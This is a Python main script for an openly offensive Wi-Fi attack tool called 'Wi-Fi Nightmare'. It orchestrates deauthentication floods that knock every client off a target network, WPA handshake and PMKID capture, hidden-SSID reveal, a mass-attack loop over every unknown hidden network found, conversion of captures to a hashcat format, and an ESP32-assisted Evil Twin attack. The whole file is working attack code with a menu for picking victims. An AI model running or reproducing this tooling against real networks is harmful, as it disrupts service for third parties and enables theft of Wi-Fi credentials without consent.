# main.py
#!/usr/bin/env python3
import sys
import time
import os
import signal
import threading
from scapy.all import sniff

# Import Modules
from config import *
import utils
import ui
from database import DatabaseHandler
from scanner import NetworkScanner, ClientMonitor
from logger import logger, setup_logger

# Import ESP32 & Attack Modules
try:
    from esp_driver import ESP32Driver
    from attacks import EvilTwinAttack, NetworkAttacker
except ImportError:
    # Disable features if modules missing
    ESP32Driver = None
    EvilTwinAttack = None
    NetworkAttacker = None

class WifiGTR:
    def __init__(self, interface, serial_port=None):
        self.original_interface = interface
        self.interface = interface
        self.serial_port = serial_port
        self.db = DatabaseHandler()
        
        utils.check_root()
        utils.check_interface_exists(self.interface)
        
        self.scanner = None
        self.display_list = []
        self.esp_driver = None 
        
    def start(self):
        logger.info("Starting Wi-Fi Nightmare")
        
        # 1. Enable Monitor Mode
        self.interface = utils.enable_monitor_mode(self.interface)
        utils.run_command(["ip", "link", "set", self.interface, "up"])
        
        # 2. Connect to ESP32 (if port provided)
        if self.serial_port:
            if ESP32Driver:
                print(f"{C_CYAN}[*] Connecting to ESP on port {self.serial_port}...{C_RESET}")
                logger.info(f"Connecting to ESP on {self.serial_port}")
                self.esp_driver = ESP32Driver(self.serial_port)
                
                if self.esp_driver.connect():
                    print(f"{C_GREEN}[+] ESP Connected Successfully.{C_RESET}")
                else:
                    print(f"{C_RED}[!] Failed to connect to ESP. Running in Standalone Mode.{C_RESET}")
                    logger.error("ESP connection failed")
                    self.esp_driver = None
                    time.sleep(1)
                    input("Press Enter to continue...")
            else:
                print(f"{C_RED}[!] ESP Modules missing. Running in Standalone Mode.{C_RESET}")
                input("Press Enter to continue...")
        else:
            print(f"{C_YELLOW}[*] No Serial Port provided. Running in Standalone Mode (No ESP features).{C_RESET}")
            logger.info("Running in standalone mode")
            input("Press Enter to continue...")

        # 3. Start Scanner
        self.scanner = NetworkScanner(self.interface, self.db)
        self.main_loop()

    def main_loop(self):
        while True:
            try:
                ui.print_main_menu(self.interface)
                
                # Show ESP Status
                if self.esp_driver and self.esp_driver.is_connected:
                    esp_status = f"{C_GREEN}Connected ({self.serial_port}){C_RESET}"
                else:
                    esp_status = f"{C_GREY}Not Connected{C_RESET}"
                
                print(f"    ESP Status: {esp_status}")
                print("--------------------------------------------------")
                
                choice = input(f"{C_YELLOW}[?]{C_RESET} Select Option: ").strip()
                
                if choice == '1':   # Scan
                    self.scan_workflow()
                elif choice == '2': # Client Monitor
                    if not self.scanner: 
                        print(f"{C_RED}[!] Error: Scanner not initialized.{C_RESET}")
                        continue
                    monitor = ClientMonitor(self.scanner)
                    monitor.start()
                    input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
                elif choice == '3': # Mass Attack
                    self.run_mass_attack()
                elif choice == '4': # Database
                    self.database_workflow()
                elif choice == '0':
                    self.cleanup()
                    sys.exit()
                else:
                    print(f"\n{C_RED}[!] Invalid option.{C_RESET}")
                    time.sleep(1)
            except KeyboardInterrupt:
                self.cleanup()
                sys.exit()

    def cleanup(self):
        print(f"\n{C_YELLOW}[*] Shutting down...{C_RESET}")
        logger.info("Shutting down")
        
        # Stop ESP32 safely
        if self.esp_driver and self.esp_driver.is_connected:
            print(f"{C_RED}[*] Sending STOP command to ESP...{C_RESET}")
            self.esp_driver.stop_all() 
            time.sleep(0.5)            
            self.esp_driver.close()    
            print(f"{C_GREEN}[+] ESP Stopped.{C_RESET}")
            
        # Restore interface to managed mode and restart NetworkManager
        utils.restore_managed_mode(self.interface)
        
        print(f"{C_YELLOW}[*] Exiting.{C_RESET}")

    def scan_workflow(self):
        utils.run_command(["ip", "link", "set", self.interface, "up"])
        
        self.run_scanner_process()
        
        if not self.display_list:
            input("No networks found. Press Enter...")
            return

        target = self.select_target_from_list()
        if not target: return 

        bssid, channel = target
        net_info = self.scanner.networks[bssid]
        ssid_name = net_info['SSID']
        client_count = len(net_info.get('Clients', []))

        while True:
            ui.print_target_menu(ssid_name, bssid, channel, client_count)
            
            if self.esp_driver and self.esp_driver.is_connected:
                print(f"{C_WHITE}[6] 😈 Evil Twin Attack (ESP Ready){C_RESET}")
            else:
                print(f"{C_GREY}[6] 😈 Evil Twin Attack (Unavailable - No ESP){C_RESET}")
            
            print(f"{C_CYAN}-{'-'*24}{C_RESET}")

            action = input(f"{C_YELLOW}[?]{C_RESET} Select Action: ").strip()

            if action == '1': # Handshake
                self.run_attack((bssid, channel), mode="handshake")
            elif action == '2': # Reveal
                self.run_attack((bssid, channel), mode="reveal")
            elif action == '3': # Deauth
                self.run_attack((bssid, channel), mode="deauth_only")
            elif action == '4': # Passive
                self.run_attack((bssid, channel), mode="passive")
            elif action == '5': # Gen Hash
                # Generate hc22000
                info = self.db.get_info(bssid)
                if info and info.get('HSFile') and os.path.exists(info['HSFile']):
                     utils.generate_hc22000(info['HSFile'])
                     input("Press Enter to return to menu...")
                else:
                    print(f"{C_RED}[!] No handshake file found for this target.{C_RESET}")
                    if info and info.get('HSFile'):
                         print(f"    Missing file: {info['HSFile']}")
                    print(f"{C_YELLOW}[*] Capture a handshake first (Option 1).{C_RESET}")
                    time.sleep(2)
            elif action == '6': # Evil Twin Logic
                if self.esp_driver and self.esp_driver.is_connected:
                    self.run_eviltwin_workflow(bssid, channel, ssid_name)
                else:
                    time.sleep(1)
            else:
                print(f"\n{C_RED}[!] Invalid option.{C_RESET}")
                time.sleep(1)

    def run_eviltwin_workflow(self, bssid, channel, ssid):
        if not self.esp_driver or not self.esp_driver.is_connected:
            print(f"\n{C_RED}[!] Error: ESP connection lost.{C_RESET}")
            return

        print(f"\n{C_CYAN}[*] Checking for existing Handshake...{C_RESET}")
        info = self.db.get_info(bssid)
        
        has_handshake = False
        if info and info.get('Handshake'):
            if info.get('HSFile') and os.path.exists(info['HSFile']):
                has_handshake = True
        
        if not has_handshake:
            print(f"{C_YELLOW}[!] No handshake found for {ssid}. Starting Capture Attack first...{C_RESET}")
            time.sleep(1)
            
            # 1. Run attack (Reveal + Handshake)
            self.run_attack((bssid, channel), mode="handshake", auto_exit=True)
            
            # 2. Update DB info
            info = self.db.get_info(bssid)
            
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']
                print(f"{C_GREEN}[+] Target Decloaked: {ssid}{C_RESET}")

            # Verify handshake again
            if info and info.get('Handshake') and os.path.exists(info.get('HSFile', '')):
                print(f"{C_GREEN}[+] Handshake captured successfully.{C_RESET}")
                time.sleep(1)
            else:
                print(f"{C_RED}[-] Failed to capture handshake. Cannot start Evil Twin.{C_RESET}")
                # Debug info
                if info:
                    print(f"[Debug] DB Info: HS={info.get('Handshake')}, File={info.get('HSFile')}")
                else:
                    print("[Debug] Info is None")
                input("Press Enter...")
                return
        else:
            print(f"{C_GREEN}[+] Found valid handshake: {info['HSFile']}{C_RESET}")
            if info and info.get('SSID') and info['SSID'] != "<HIDDEN>":
                ssid = info['SSID']
        
        # Final check for SSID before starting Evil Twin
        if ssid == "<HIDDEN>" or ssid == "Unknown":
             print(f"{C_YELLOW}[!] SSID could not be automatically revealed.{C_RESET}")
             manual_ssid = input(f"{C_YELLOW}[?] Enter SSID manually (or leave empty to abort): {C_RESET}").strip()
             if manual_ssid:
                 ssid = manual_ssid
                 self.db.save(bssid, ssid)
             else:
                 print(f"{C_RED}[!] Aborted.{C_RESET}")
                 return

        print(f"{C_CYAN}[*] Proceeding to Evil Twin with SSID: {ssid}{C_RESET}")

        if EvilTwinAttack:
            et_attack = EvilTwinAttack(self.esp_driver, self.db, bssid, channel, ssid, interface=self.interface)
            et_attack.run()
        else:
            print(f"{C_RED}[!] Error: EvilTwin module not loaded.{C_RESET}")
        
        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")

    def run_scanner_process(self):
        self.scanner.stop_sniffing = False
        def signal_handler(sig, frame): self.scanner.stop_sniffing = True
        original_sigint = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, signal_handler)

        hopper = threading.Thread(target=self.scanner.channel_hopper, daemon=True)
        hopper.start()

        try:
            last_print = 0
            while not self.scanner.stop_sniffing:
                try:
                    sniff(iface=self.interface, prn=self.scanner.packet_handler, count=0, timeout=0.1, store=0)
                except OSError:
                    # Safe restart
                    utils.run_command(["ip", "link", "set", self.interface, "up"])
                    continue

                if time.time() - last_print > 0.5:
                    self.display_list = ui.print_scan_table(self.interface, self.scanner.networks, self.scanner.lock)
                    last_print = time.time()
        except KeyboardInterrupt:
            self.scanner.stop_sniffing = True
        
        signal.signal(signal.SIGINT, original_sigint)
        print(f"\n{C_YELLOW}[!] Scan Stopped.{C_RESET}")

    def select_target_from_list(self):
        while True:
            try:
                choice = input(f"\n[?] Select Network ID (Enter to cancel): ").strip()
                if choice == "": return None
                
                if not choice.isdigit():
                    print(f"{C_RED}[!] Please enter a valid number.{C_RESET}")
                    continue
                    
                idx = int(choice)
                if 0 <= idx < len(self.display_list):
                    bssid = self.display_list[idx]
                    channel = self.scanner.networks[bssid]['Channel']
                    print(f"\n{C_GREEN}[+] Target Selected: {bssid} (CH: {channel}){C_RESET}")
                    utils.run_command(["iwconfig", self.interface, "channel", str(channel)])
                    return (bssid, channel)
                else:
                    print(f"{C_RED}[!] Invalid ID. Choose 0-{len(self.display_list)-1}.{C_RESET}")
            except Exception as e:
                logger.error(f"Input error: {e}")
                return None

    def run_mass_attack(self):
        if not self.display_list:
            print(f"{C_RED}[!] You must Scan first to populate targets.{C_RESET}")
            self.run_scanner_process()
            
        hidden_targets = []
        for bssid in self.display_list:
            net = self.scanner.networks[bssid]
            if net['Hidden'] and not net['Known']: 
                hidden_targets.append((bssid, net['Channel']))
        
        if not hidden_targets:
            print(f"{C_RED}[-] No unknown hidden networks found.{C_RESET}")
            input("Press Enter...")
            return

        print(f"\n{C_CYAN}[*] Found {len(hidden_targets)} hidden networks.{C_RESET}")
        try: 
            user_input = input(f"[?] Duration per network (seconds, default 30): ").strip()
            duration = int(user_input) if user_input else 30
        except: 
            duration = 30
            
        print(f"{C_YELLOW}[*] Starting Mass Attack... (Ctrl+C to Skip current){C_RESET}")
        
        results_count = 0
        for i, (bssid, channel) in enumerate(hidden_targets):
            print(f"\n{C_WHITE}--- Target {i+1}/{len(hidden_targets)}: {bssid} ---{C_RESET}")
            utils.run_command(["iwconfig", self.interface, "channel", str(channel)])
            
            attacker = NetworkAttacker(
                interface=self.interface,
                target_bssid=bssid,
                target_channel=channel,
                db_handler=self.db,
                attack_mode="reveal"
            )
            
            def skip_handler(sig, frame): attacker.stop_attack = True 
            original_sigint = signal.getsignal(signal.SIGINT)
            signal.signal(signal.SIGINT, skip_handler)
            
            attacker.start_deauth_thread()
            
            start_time = time.time()
            while not attacker.success and not attacker.stop_attack:
                if time.time() - start_time > duration: break 
                try:
                    sniff(iface=self.interface, prn=attacker.sniffer_callback, count=0, timeout=0.5, store=0)
                except OSError:
                    utils.run_command(["ip", "link", "set", self.interface, "up"])

            signal.signal(signal.SIGINT, original_sigint)
            attacker.stop_attack = True 
            attacker.join_threads() # Ensure clean exit

            if attacker.success and attacker.result_data:
                self.db.save(bssid, attacker.result_data['SSID'])
                print(f"\n{C_GREEN}[+] SUCCESS: {bssid} -> {attacker.result_data['SSID']}{C_RESET}")
                results_count += 1
        
        print(f"\n{C_CYAN}=== Mass Attack Finished. Revealed: {results_count} ==={C_RESET}")
        input("Press Enter...")

    def run_attack(self, target, mode="reveal", auto_exit=False):
        bssid, channel = target
        current_ssid = self.scanner.networks[bssid]['SSID']
        if current_ssid == "<HIDDEN>": current_ssid = "Unknown"
        
        # Prepare Interface
        utils.run_command(["ip", "link", "set", self.interface, "up"])
        utils.run_command(["iwconfig", self.interface, "channel", str(channel)])

        attacker = NetworkAttacker(
            interface=self.interface, 
            target_bssid=bssid, 
            target_channel=channel, 
            db_handler=self.db, 
            attack_mode=mode, 
            target_ssid=current_ssid
        )
        
        msg = f"Mode: {mode.upper()}"
        print(f"{C_RED}[*] Starting: {msg} (Ctrl+C to Stop)...{C_RESET}")
        logger.info(f"Starting attack on {bssid} ({mode})")
        
        def signal_handler(sig, frame): 
            attacker.stop_attack = True
            if mode == "deauth_only":
                print(f"\n{C_YELLOW}[*] Stopping Deauth Attack...{C_RESET}")
        
        original_sigint = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, signal_handler)

        # Start deauth thread for appropriate modes
        if mode in ["deauth_only", "handshake", "reveal"]:
            attacker.start_deauth_thread()
            if mode == "deauth_only":
                print(f"{C_YELLOW}[+] Sending deauth packets to disconnect clients from {bssid}{C_RESET}")
                print(f"{C_YELLOW}[+] Targeting all connected clients on channel {channel}{C_RESET}")

        # Check ESP
        esp_active = False
        if self.esp_driver and self.esp_driver.is_connected:
            if mode != "passive":
                print(f"{C_YELLOW}[+] ESP Detected: Using 'Burst' Attack Mode.{C_RESET}")
                esp_active = True

        loop_count = 0 
        last_esp_attack = 0 
        deauth_count = 0  # Counter for deauth packets sent

        while not attacker.stop_attack:
            # Break conditions for other modes
            if mode == "handshake" and attacker.handshake_captured: 
                # If SSID is still unknown, give it a few more cycles to reveal
                if attacker.target_ssid == "Unknown" or attacker.target_ssid == "<HIDDEN>":
                    if not hasattr(attacker, 'reveal_wait_start'):
                        attacker.reveal_wait_start = time.time()
                        print(f"\n{C_YELLOW}[*] Handshake captured. Waiting for SSID Reveal...{C_RESET}")
                    
                    # Wait max 10 seconds for SSID
                    if time.time() - attacker.reveal_wait_start > 10:
                        break
                else:
                    break
            
            if mode == "pmkid" and attacker.pmkid_captured: 
                break
            if mode == "reveal" and attacker.success: 
                break
            
            current_time = time.time()
            loop_count += 1 
            
            # Status message based on mode
            if mode == "passive":
                status = "Listening"
            elif mode == "deauth_only":
                status = "Deauthing"
                # Track deauth packets
                if hasattr(attacker, 'deauth_sent'):
                    deauth_count = attacker.deauth_sent
            else:
                status = "Attacking"
            
            # Pulsed Attack Logic for ESP
            if esp_active and mode != "passive":
                if current_time - last_esp_attack > 5:  # Every 5 seconds
                    self.esp_driver.start_attack(bssid, channel, duration=2)
                    last_esp_attack = current_time

            # Display info
            clients_str = f"{len(attacker.clients)} Clients"
            if mode == "deauth_only":
                clients_str = f"{len(attacker.clients)} Clients, {deauth_count} Deauths"
            
            ssid_display = attacker.target_ssid if attacker.target_ssid != "Unknown" else ""
            if ssid_display: 
                ssid_display = f"({C_GREEN}{ssid_display}{C_RESET}) "

            # Display Status
            dual_msg = f" {C_RED}+ ESP{C_RESET}" if esp_active else ""
            alert_msg = ""
            
            # Show extended capture status
            if hasattr(attacker, 'extended_capture_start'):
                elapsed = int(time.time() - attacker.extended_capture_start)
                remaining = max(0, 10 - elapsed)
                alert_msg = f" {C_CYAN}[Collecting context frames: {remaining}s]{C_RESET}"
            elif attacker.handshake_captured: 
                alert_msg = f" {C_GREEN}[HANDSHAKE!]{C_RESET}"
            elif attacker.pmkid_captured: 
                alert_msg = f" {C_GREEN}[PMKID!]{C_RESET}"

            sys.stdout.write(f"\r\033[K[{loop_count}] [*] {status}{dual_msg}{alert_msg} {ssid_display}> {clients_str}")
            sys.stdout.flush()
            
            # Sniff for packets (even in deauth mode to see client responses)
            try:
                sniff(iface=self.interface, prn=attacker.sniffer_callback, count=0, timeout=0.2, store=0)
            except OSError:
                utils.run_command(["ip", "link", "set", self.interface, "up"])

        # Restore original signal handler
        signal.signal(signal.SIGINT, original_sigint)
        
        # Stop all attack threads
        attacker.stop_attack = True
        attacker.join_threads()
        
        # Stop ESP if active
        if esp_active:
            self.esp_driver.stop_all()

        # Handle results based on mode
        if mode == "deauth_only":
            # Deauth-only summary
            print(f"\n{C_YELLOW}[*] Deauth Attack Finished{C_RESET}")
            print(f"{C_WHITE}    Target: {bssid}")
            print(f"    Channel: {channel}")
            print(f"    SSID: {current_ssid if current_ssid != 'Unknown' else 'Hidden'}")
            print(f"    Clients Targeted: {len(attacker.clients)}")
            if hasattr(attacker, 'deauth_sent'):
                print(f"    Deauth Packets Sent: {attacker.deauth_sent}")
            print(f"    Duration: {loop_count * 0.2:.1f} seconds{C_RESET}")
            
        elif attacker.handshake_captured or attacker.pmkid_captured:
            # Handshake/PMKID capture success
            final_ssid = attacker.target_ssid
            if final_ssid != "Unknown":
                self.db.save(bssid, final_ssid)
            
            f_type = "PMKID" if attacker.pmkid_captured else "Handshake"
            self.db.update_handshake(bssid, True, utils.get_current_time_12h(), filename=attacker.handshake_filename)
            
            logger.info(f"{f_type} captured for {bssid}")
            print(f"\n{C_CYAN}[+] {f_type} Captured!{C_RESET}")
            print(f"{C_WHITE}    Saved to: {attacker.handshake_filename}{C_RESET}")
            
        elif mode == "reveal" and attacker.success:
            # SSID reveal success
            self.db.save(bssid, attacker.result_data['SSID'])
            ui.print_attack_summary(attacker.result_data)
            
        else:
            # General finish message
            print("\n[!] Attack Finished/Stopped.")
        
        if not auto_exit:
            input("\nPress Enter to return to menu...")

    def database_workflow(self):
        while True:
            ui.print_database_menu()
            op = input(f"{C_YELLOW}[?]{C_RESET} Select Action: ").strip()
            if op == '1':
                ui.show_saved_db(self.db)
                input("Press Enter...")
            elif op == '2':
                self.verify_password_logic()
            elif op == '0':
                break
            else:
                 print(f"\n{C_RED}[!] Invalid option.{C_RESET}")
                 time.sleep(0.5)

    def verify_password_logic(self):
        saved_list = ui.show_saved_db(self.db)
        if not saved_list:
            input("Press Enter...")
            return
            
        choice = input(f"{C_YELLOW}[?]{C_RESET} Enter Network ID to verify: ").strip()
        if choice.isdigit():
            idx = int(choice)
            if 0 <= idx < len(saved_list):
                bssid = saved_list[idx]
                data = self.db.get_info(bssid)
                pcap = data.get('HSFile', '')
                if not pcap or not os.path.exists(pcap):
                    print(f"{C_RED}[-] File missing.{C_RESET}")
                    input("Enter...")
                    return
                pwd = input(f"[?] Password for {data['SSID']}: ").strip()
                if utils.verify_password(pcap, bssid, data['SSID'], pwd):
                    print(f"\n{C_GREEN}[SUCCESS] Correct Password!{C_RESET}")
                else:
                    print(f"\n{C_RED}[FAILURE] Incorrect.{C_RESET}")
                input("Enter...")
        else:
            print(f"{C_RED}[!] Invalid ID.{C_RESET}")
            time.sleep(1)

if __name__ == "__main__":
    setup_logger()
    
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print(f"{C_YELLOW}Usage:{C_RESET} sudo python3 main.py <interface> [serial_port]")
        print(f"{C_YELLOW}Ex 1 (Standalone):{C_RESET} sudo python3 main.py wlan0")
        print(f"{C_YELLOW}Ex 2 (With ESP):{C_RESET} sudo python3 main.py wlan0 /dev/ttyUSB0")
        sys.exit(1)
    
    port = sys.argv[2] if len(sys.argv) == 3 else None
    
    try:
        app = WifiGTR(sys.argv[1], port)
        app.start()
    except KeyboardInterrupt:
        print("\n[!] Bye.")
        logger.info("User interrupted (KeyboardInterrupt)")
    except Exception as e:
        logger.exception(f"Unhandled exception: {e}")
        print(f"\n{C_RED}[!] Critical Error: {e}{C_RESET}")